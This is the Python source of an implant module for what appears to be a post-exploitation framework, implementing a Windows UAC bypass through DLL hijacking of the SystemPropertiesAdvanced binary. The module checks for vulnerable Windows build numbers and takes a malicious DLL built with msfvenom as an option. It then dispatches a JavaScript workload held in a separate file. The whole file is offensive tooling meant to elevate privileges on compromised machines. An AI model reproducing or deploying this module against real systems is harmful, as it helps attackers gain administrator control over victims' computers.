import core.job
import core.implant
import uuid

class SystemPropertiesAdvancedJob(core.job.Job):
    def create(self):
        if self.session_id == -1:
            return
        if (int(self.session.build) < 14393 or int(self.session.build) >= 18632) and self.options.get("IGNOREBUILD") == "false":
            self.error("0", "The target may not be vulnerable to this implant. Set IGNOREBUILD to true to run anyway.", "Target build not vuln", "")
            return False

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed"

class SystemPropertiesAdvancedImplant(core.implant.Implant):

    NAME = "Bypass UAC  SystemPropertiesAdvanced"
    DESCRIPTION = "UAC bypass through DLL Hijacking method (systempropertiesadvanced binary)"
    AUTHORS = ["@JosueEncinar"]
    STATE = "implant/elevate/bypassuac_systempropertiesadvanced"

    def load(self):
        self.options.register("USER", "", "Current User")
        self.options.register("DLL", "", "Malicius DLL. First use msfvenom and upload it to Windows. Example: C:/Users/IEUser/Desktop/srrstr.dll")

    def job(self):
        return SystemPropertiesAdvancedJob

    def run(self):
        workloads = {}
        workloads["js"] = "data/implant/elevate/bypassuac_systempropertiesadvanced.js"

        self.dispatch(workloads, self.job)
